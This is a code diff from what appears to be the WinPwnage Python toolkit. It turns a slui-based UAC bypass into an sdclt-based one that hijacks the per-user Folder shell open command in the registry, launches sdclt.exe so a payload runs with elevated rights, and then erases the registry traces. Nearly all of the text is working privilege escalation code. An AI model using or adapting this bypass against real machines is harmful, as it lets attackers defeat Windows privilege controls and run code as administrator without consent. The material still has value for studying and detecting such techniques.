@@ -3,19 +3,21 @@ import time
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
-slui_info = {
-	"Description": "Bypass UAC using slui and registry key manipulation",
-	"Id": "3",
+#http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
+
+sdclt_info = {
+	"Description": "Bypass UAC using sdclt and registry key manipulation",
+	"Id": "16",
 	"Type": "UAC bypass",
-	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
-	"Works From": "9600",
+	"Fixed In": "999999" if not information().uac_level() == 4 else "0",
+	"Works From": "14393",
 	"Admin": False,
-	"Function Name": "slui",
+	"Function Name": "sdclt_uacbypass",
 	"Function Payload": True,
 }
 
 
-def	slui_cleanup(path):
+def sdclt_uacbypass_cleanup(path):
 	print_info("Performing cleaning")
 	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
 		print_success("Successfully cleaned up")
@@ -24,9 +26,9 @@ def	slui_cleanup(path):
 		print_error("Unable to cleanup")
 		return False
 
-def slui(payload):
+def sdclt_uacbypass(payload):
 	if payloads().exe(payload):
-		path = "Software\\Classes\\exefile\\shell\\open\\command"
+		path = "Software\\Classes\\Folder\\shell\\open\\command"
 
 		if registry().modify_key(hkey="hkcu", path=path, name=None, value=payload, create=True):
 			if registry().modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
@@ -35,7 +37,7 @@ def slui(payload):
 				print_error("Unable to create registry keys")
 				for x in Constant.output:
 					if "error" in x:
-						slui_cleanup(path)
+						sdclt_uacbypass_cleanup(path)
 						return False
 		else:
 			print_error("Unable to create registry keys")
@@ -46,15 +48,15 @@ def slui(payload):
 		print_info("Disabling file system redirection")
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
-			if process().runas(os.path.join("slui.exe")):
-				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
+			if process().create("sdclt.exe"):
+				print_success("Successfully spawned process ({})".format(payload))
 				time.sleep(5)
-				slui_cleanup(path)
+				sdclt_uacbypass_cleanup(path)
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
 				for x in Constant.output:
 					if "error" in x:
-						slui_cleanup(path)
+						sdclt_uacbypass_cleanup(path)
 						return False
 	else:
 		print_error("Cannot proceed, invalid payload")
